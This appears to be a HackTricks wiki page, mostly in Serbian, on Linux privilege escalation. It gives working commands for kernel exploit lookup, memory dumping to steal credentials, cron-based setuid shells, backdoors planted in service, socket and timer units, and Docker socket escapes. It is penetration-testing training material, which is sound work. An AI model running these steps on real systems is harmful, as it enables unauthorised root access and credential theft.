# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacije o sistemu

### Informacije o OS-u

Počnimo sa prikupljanjem informacija o pokrenutom OS-u.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Putanja

Ako **imate dozvole za pisanje na bilo koji folder unutar promenljive `PATH`** možda ćete moći da preuzmete kontrolu nad nekim bibliotekama ili binarnim fajlovima:
```bash
echo $PATH
```
### Informacije o varijablama okruženja

Ima li u varijablama okruženja zanimljivih informacija, lozinki ili API ključeva?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite kernel version i da li postoji exploit koji se može koristiti za escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobar spisak ranjivih kernela i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi na kojima možete pronaći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve verzije ranjivih kernela sa te stranice, možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći da pronađete kernel exploits su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, samo proverava exploits za kernel 2.x)

Uvek **pretraži kernel verziju na Google-u**, moguće je da je tvoja kernel verzija navedena u nekom kernel exploit-u i tada ćeš biti siguran da je taj exploit validan.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih sudo verzija koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: verifikacija potpisa nije uspela

Proveri **smasher2 box of HTB** za **primer** kako se ova vuln može iskoristiti
```bash
dmesg 2>/dev/null | grep "signature"
```
### Više sistemske enumeracije
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Popis mogućih odbrana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako se nalazite unutar docker container-a, možete pokušati da pobegnete iz njega:

{{#ref}}
docker-security/
{{#endref}}

## Diskovi

Proverite **what is mounted and unmounted**, gde i zašto. Ako je nešto unmounted, možete pokušati da ga mount-ujete i proverite da li sadrži privatne informacije
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Koristan softver

Nabrojte korisne binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proveri da li je **bilo koji compiler instaliran**. Ovo je korisno ako treba da upotrebiš neki kernel exploit, jer se preporučuje da ga kompajliraš na mašini na kojoj ćeš ga koristiti (ili na sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara verzija Nagios-a (na primer) koja bi mogla biti iskorišćena za escalating privileges…\
Preporučuje se ručno proveriti verzije sumnjivijih instaliranih softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini, možete takođe koristiti **openVAS** da proverite zastareli i ranjiv softver instaliran na mašini.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će u većini slučajeva biti beskorisne, stoga se preporučuju aplikacije kao što su OpenVAS ili slične koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate exploits_

## Procesi

Pogledajte **koji procesi** se izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** ih detektuje proverom `--inspect` parametra u komandnoj liniji procesa.\
Takođe **proverite svoje privilegije nad binarnim fajlovima procesa**, možda možete prepisati tuđe.

### Process monitoring

Možete koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti vrlo korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Process memory

Neki servisi na serveru čuvaju **podatke za prijavu u čistom tekstu u memoriji**.\
Obično će vam trebati **root privileges** da biste čitali memoriju procesa koji pripadaju drugim korisnicima, stoga je ovo uglavnom korisnije kada ste već root i želite otkriti dodatne podatke za prijavu.\
Međutim, zapamtite da **kao običan korisnik možete čitati memoriju procesa koje posedujete**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB skripta
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps prikazuju kako je memorija mapirana unutar tog procesa** virtuelnog adresnog prostora; takođe prikazuju **dozvole svake mapirane oblasti**. Pseudo fajl **mem** **otkriva samu memoriju procesa**. Iz **maps** fajla znamo koje su **memorijske oblasti čitljive** i njihovi offseti. Koristimo ove informacije da **seek into the mem file and dump sve čitljive oblasti** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` omogućava pristup sistemskoj **fizičkoj** memoriji, a ne virtuelnoj memoriji. Virtualnom adresnom prostoru kernela može se pristupiti koristeći /dev/kmem.\
Obično je `/dev/mem` čitljiv samo za **root** i **kmem** grupu.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump je reinterpretacija za linux klasičnog alata ProcDump iz paketa Sysinternals za Windows. Preuzmite ga na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za dump a process memory možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti root zahteve i dump the process owned by you
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)

### Kredencijali iz Process Memory

#### Ručni primer

Ako otkrijete da authenticator process radi:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dump-ovati process (pogledajte prethodne sekcije za različite načine dump-ovanja memory-ja procesa) i pretražiti credentials unutar memory-ja:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti podatke za prijavu u čistom tekstu iz memorije** i iz nekih **dobro poznatih datoteka**. Za ispravan rad zahteva root privilegije.

| Funkcija                                          | Ime procesa          |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktivne FTP konekcije)                    | vsftpd               |
| Apache2 (aktivne HTTP Basic Auth sesije)          | apache2              |
| OpenSSH (aktivne SSH sesije - upotreba sudo)      | sshd:                |

#### Pretraga Regex-a/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron jobs

Proverite da li je neki zakazani zadatak ranjiv. Možda možete iskoristiti skriptu koja se izvršava kao root (wildcard vuln? možete li izmeniti fajlove koje root koristi? koristiti symlinks? kreirati specifične fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron putanja

Na primer, u _/etc/crontab_ možete наћи PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Obratite pažnju kako korisnik "user" ima права za pisanje над /home/user_)

Ako у ovom crontab-u root pokušava да izvrši neku komandu ili skript без postavljanja PATH-a. На пример: _\* \* \* \* root overwrite.sh_\
Tada можете dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron koji koristi skriptu sa wildcard-om (Wildcard Injection)

Ako se skripta izvršava kao root i sadrži “**\***” u komandi, možete to iskoristiti da izazovete neočekivane stvari (kao privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako je wildcard prethodi putanji kao** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za više trikova za iskorišćavanje wildcard-a:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Prepisivanje cron skripte i symlink

Ako možete **modifikovati cron script** koji se izvršava kao root, možete vrlo lako dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako script koji izvršava root koristi **directory where you have full access**, možda bi bilo korisno obrisati taj folder i **create a symlink folder to another one** koji će služiti za pokretanje script koje kontrolišete
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Česti cron jobs

Možete pratiti procese da biste pronašli procese koji se izvršavaju svakih 1, 2 ili 5 minuta. Možda to možete iskoristiti i escalate privileges.

Na primer, da biste **nadgledali svakih 0.1s tokom 1 minute**, **sortirali po manje izvršenim komandama** i izbrisali komande koje su se najviše izvršavale, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Takođe možete koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će nadgledati i prikazati svaki proces koji se pokrene).

### Nevidljivi cron jobs

Moguće je kreirati cronjob stavljanjem carriage return-a nakon komentara (bez newline karaktera), i cron job će raditi. Primer (obratite pažnju na carriage return karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### Upisivi _.service_ fajlovi

Proverite da li možete upisati bilo koji `.service` fajl, ako možete, **možete ga izmeniti** tako da **pokreće** vaš **backdoor kada** se servis **pokrene**, **restartuje** ili **zaustavi** (možda ćete morati da sačekate dok se mašina ne rebootuje).\
Na primer kreirajte vaš backdoor unutar .service fajla sa **`ExecStart=/tmp/script.sh`**

### Upisivi binarni fajlovi servisa

Imajte na umu da ako imate **prava za pisanje nad binarnim fajlovima koje izvršavaju servisi**, možete ih izmeniti da sadrže backdoor, tako da će, kada se servisi ponovo izvrše, taj backdoor biti pokrenut.

### systemd PATH - Relativne putanje

Možete videti PATH koji koristi **systemd** pomoću:
```bash
systemctl show-environment
```
Ako otkrijete da možete da **pišete** u bilo kojem od direktorijuma na putanji, možda ćete moći da **escalate privileges**. Treba da tražite **relativne putanje koje se koriste u konfiguracionim fajlovima servisa** kao na primer:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim, kreirajte **izvršni fajl** sa **istim imenom kao binarni fajl relativne putanje** unutar systemd PATH direktorijuma u koji možete pisati, i kada se servis zatraži da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), vaš **backdoor će biti izvršen** (neprivilegovani korisnici obično ne mogu pokretati/zaustavljati servise, ali proverite da li možete koristiti `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Tajmeri**

**Tajmeri** su systemd unit fajlovi čije ime završava na `**.timer**` koji kontrolišu `**.service**` fajlove ili događaje. **Tajmeri** se mogu koristiti kao alternativa za cron jer imaju ugrađenu podršku za događaje zasnovane na kalendaru i monotone vremenske događaje i mogu se pokretati asinhrono.

Možete izlistati sve tajmere koristeći:
```bash
systemctl list-timers --all
```
### Tajmeri koji se mogu izmeniti

Ako možete izmeniti tajmer, možete ga naterati da izvrši neke postojeće instance systemd.unit (kao što su `.service` ili `.target`).
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je jedinica:

> Jedinica koja se aktivira kada ovaj timer istekne. Argument je ime jedinice, čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano pokazuje na service koji ima isto ime kao timer jedinica, osim sufiksa. (Vidi iznad.) Preporučuje se da ime jedinice koja se aktivira i ime timer jedinice budu identični, osim sufiksa.

Dakle, da biste zloupotrebili ovu dozvolu potrebno je da:

- Pronađite neku systemd jedinicu (npr. `.service`) koja je **izvršava binarni fajl nad kojim imate privilegije pisanja**
- Pronađite neku systemd jedinicu koja **izvršava relativnu putanju** i za koju imate **privilegije za pisanje** nad **systemd PATH** (da biste imitirali taj izvršni fajl)

**Saznajte više o timerima pomoću `man systemd.timer`.**

### **Omogućavanje timera**

Da biste omogućili timer potrebne su root privilegije i potrebno је izvršiti:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

Ako nađete **writable** `.socket` fajl možete **dodati** na početak `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će biti izvršen pre nego što se socket kreira. Zato ćete **verovatno morati da sačekate restart mašine.**\
_Napomena da sistem mora koristiti tu konfiguraciju `.socket` fajla ili backdoor neće biti izvršen_

### Writable sockets

Ako **identifikujete bilo koji writable socket** (_sada govorimo o Unix Sockets, a ne o konfiguracionim `.socket` fajlovima_), onda **možete komunicirati** sa tim socket-om i možda iskoristiti neku ranjivost.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Sirova konekcija
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da može postojati nekoliko **sockets koji slušaju HTTP** zahteva (_ne mislim na .socket fajlove već na fajlove koji funkcionišu kao unix sockets_). Možete to proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako socket **odgovori na HTTP** zahtev, možeš sa njim **komunicirati** i možda **iskoristiti neku ranjivost**.

### Docker socket sa pristupom za pisanje

Docker socket, često pronađen na `/var/run/docker.sock`, predstavlja kritičan fajl koji treba zaštititi. Podrazumevano, upisiv je od strane `root` korisnika i članova `docker` grupe. Posedovanje write access do ovog socketa može dovesti do privilege escalation. Ispod je prikaz kako se to može uraditi i alternativne metode ako Docker CLI nije dostupan.

#### **Privilege Escalation with Docker CLI**

Ako imaš write access do Docker socketa, možeš escalate privileges koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande vam omogućavaju da pokrenete kontejner sa root pristupom datotečnom sistemu hosta.

#### **Korišćenje Docker API-ja direktno**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati koristeći Docker API i `curl` komande.

1.  **List Docker Images:** Preuzmite listu dostupnih image-ova.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Pošaljite zahtev za kreiranje kontejnera koji montira root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Koristite `socat` da uspostavite konekciju sa kontejnerom, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možete direktno izvršavati komande u kontejneru sa root pristupom datotečnom sistemu hosta.

### Ostalo

Napomena: ako imate write permisije na docker socket zato što ste **u grupi `docker`**, imate [**više načina za eskalaciju privilegija**](interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API sluša na portu** možete ga takođe kompromitovati](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Pogledajte **još načina za bekstvo iz docker-a ili zloupotrebu za eskalaciju privilegija** u:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) eskalacija privilegija

Ako ustanovite da možete koristiti komandu **`ctr`**, pročitajte sledeću stranu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** eskalacija privilegija

Ako ustanovite da možete koristiti komandu **`runc`**, pročitajte sledeću stranu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran inter-Process Communication (IPC) sistem koji omogućava aplikacijama da efikasno komuniciraju i razmenjuju podatke. Dizajniran za moderan Linux sistem, pruža robustan okvir za različite oblike komunikacije između aplikacija.

Sistem je svestran, podržava osnovni IPC koji poboljšava razmenu podataka između procesa, podsećajući na **enhanced UNIX domain sockets**. Takođe pomaže u emitovanju događaja ili signala, podstičući besprekornu integraciju među komponentama sistema. Na primer, signal od Bluetooth daemona o dolaznom pozivu može navesti muzički plejer da utiša zvuk, poboljšavajući korisničko iskustvo. Pored toga, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve za servis i pozive metoda između aplikacija, pojednostavljujući procese koji su nekada bili kompleksni.

D-Bus radi po modelu **allow/deny**, upravljajući dozvolama za poruke (pozivi metoda, emitovanja signala, itd.) na osnovu kumulativnog efekta odgovarajućih pravila politike. Ove politike određuju interakcije sa bus-om, potencijalno omogućavajući eskalaciju privilegija iskorišćavanjem ovih dozvola.

Prikazan je primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf`, koji detaljno opisuje dozvole za korisnika root da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez navedenog korisnika ili grupe važe univerzalno, dok politike sa "default" kontekstom važe za sve koji nisu pokriveni drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Saznajte kako da enumerate i exploit D-Bus communication ovde:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je interesantno da enumerate mrežu i utvrdite poziciju mašine.

### Opšta enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otvoreni portovi

Uvek proverite mrežne servise koji rade na mašini, a sa kojima niste mogli da komunicirate pre nego što ste joj pristupili:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete sniff traffic. Ako možete, mogli biste uspeti da dobijete neke credentials.
```
timeout 1 tcpdump
```
## Korisnici

### Opšta enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji **korisnici** su u sistemu, koji mogu da se **login** i koji imaju **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Veliki UID

Neke verzije Linuxa bile su pogođene greškom koja omogućava korisnicima sa **UID > INT_MAX** da eskaliraju privilegije. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Iskoristi to koristeći:** **`systemd-run -t /bin/bash`**

### Grupe

Proveri da li si **član neke grupe** koja bi ti mogla dodeliti root privilegije:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Međuspremnik

Proveri da li se nešto zanimljivo nalazi u međuspremniku (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate bilo koju password** iz okruženja, **pokušajte da se loginujete kao svaki user** koristeći tu password.

### Su Brute

Ako vam ne smeta da pravite mnogo buke i `su` i `timeout` binarni fajlovi su prisutni na računaru, možete pokušati da bruteforce-ujete user koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa parametrom `-a` takođe pokušava da bruteforce-uje user-e.

## Zloupotrebe zapisivog $PATH

### $PATH

Ako otkrijete da možete **pisati u neki folder iz $PATH** možda ćete moći da eskalirate privilegije tako što ćete **kreirati backdoor unutar zapisivog foldera** sa imenom neke komande koja će biti izvršena od strane drugog user-a (idealno root) i koja **se ne učitava iz foldera koji se nalazi pre** vašeg zapisivog foldera u $PATH.

### SUDO and SUID

